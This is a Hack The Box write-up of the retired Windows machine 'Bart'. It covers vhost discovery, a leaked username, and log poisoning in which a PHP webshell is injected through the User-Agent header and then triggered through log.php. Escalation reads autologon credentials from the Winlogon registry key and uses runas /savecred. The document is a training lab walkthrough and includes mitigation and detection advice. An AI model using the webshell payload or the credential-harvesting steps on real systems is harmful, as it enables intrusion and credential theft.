---
machine: Bart
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, iis, vhosts, log-poisoning, autologon]
---

# Bart — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

IIS hosts three vhosts. The forum leaks a user in an HTML comment and the monitor reuses that password. The internal chat is vulnerable to log poisoning: the `User-Agent` is written to a file that is later included. Escalation reads autologon credentials from the registry.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p80 <IP>
```

- Only IIS 10 on 80.
- `forum.bart.htb`, `monitor.bart.htb`, `internal-01.bart.htb`.

## Enumeration

```bash
ffuf -u http://<IP>/ -H 'Host: FUZZ.bart.htb' -w vhosts.txt
curl -s http://forum.bart.htb/ | grep -i harvey
```

An HTML comment reveals Harvey Potter. His password on the monitor grants access and discloses the internal chat.

## Foothold

Register an account on `internal-01.bart.htb`. The chat writes the `User-Agent` to `log.txt`, and a feature includes that file:

```bash
curl -s http://internal-01.bart.htb/ -A '<?php system($_GET["c"]); ?>'
curl -s "http://internal-01.bart.htb/log.php?c=whoami"
```

The webshell runs as the service account.

## Lateral movement

Review the registry and profiles. Autologon credentials live under `Winlogon`:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## Privilege escalation

```bash
runas /user:BART\Administrator /savecred "cmd.exe /c whoami"
```

The saved credentials run commands as administrator; obtain a shell and read the flags.

## Evidence

- Vhosts and HTML comment.
- `log.txt` with the injected `User-Agent`.
- Redacted `Winlogon` values.
- `whoami` as Administrator.

## Lessons learned

- HTML comments can leak staff and usernames.
- Logging unsanitised headers is an execution path if the log is included.
- `AutoAdminLogon` leaves recoverable credentials.

## Mitigations and detection

- Do not include user-writable logs in the web server.
- Sanitise and encode all input before logging.
- Disable autologon and `DefaultPassword`.
- Alert on `runas /savecred` and on PHP tags written to logs.

## References

- <https://www.hackthebox.com/machines/Bart>
- <https://0xdf.gitlab.io/2018/07/15/htb-bart.html>
- <https://attack.mitre.org/techniques/T1190/>
- <https://attack.mitre.org/techniques/T1552/005/>
